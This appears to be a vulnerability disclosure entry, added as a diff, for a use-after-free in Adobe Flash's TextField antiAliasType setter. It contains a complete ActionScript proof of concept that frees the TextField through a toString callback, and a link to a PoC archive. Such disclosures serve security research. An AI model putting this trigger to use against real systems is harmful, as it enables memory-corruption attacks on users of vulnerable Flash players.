@@ -1,0 +1,48 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=560
+
+There is a use-after-free in the TextField antiAliasType setter. If it is set to an object with a toString method that frees the TextField, the property will be written after it is freed.
+
+A PoC is as follows:
+
+var toptf = this.createEmptyMovieClip("toptf", 1);
+
+
+function func(){
+	
+	toptf.removeMovieClip();	
+	trace("here");
+	return "advanced";
+}
+
+var o = {toString : func};
+
+
+var my_format:TextFormat = new TextFormat();
+my_format.font = "Times-12";
+
+var my_text1:TextField = toptf.createTextField("my_text1", toptf.getNextHighestDepth(), 9.5, 10, 400, 100);
+my_text1.text = "this.gridFitType = none";
+my_text1.embedFonts = true;
+my_text1.antiAliasType = o;
+my_text1.gridFitType = "none";
+my_text1.setTextFormat(my_format); 
+
+var my_text2:TextField = toptf.createTextField("my_text2", toptf.getNextHighestDepth(), 9.5, 40, 400, 100);
+my_text2.text = "this.gridFitType = advanced";
+my_text2.embedFonts = true;
+my_text2.antiAliasType = "advanced";
+my_text2.gridFitType = "pixel";
+my_text2.setTextFormat(my_format); 
+
+var my_text3:TextField = toptf.createTextField("my_text3", toptf.getNextHighestDepth(), 9.5, 70, 400, 100);
+my_text3.text = "this.gridFitType = subpixel";
+my_text3.embedFonts = true;
+my_text3.antiAliasType = "advanced";
+my_text3.gridFitType = "subpixel";
+my_text3.setTextFormat(my_format);
+
+A sample fla and swf are attached.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39019.zip
+
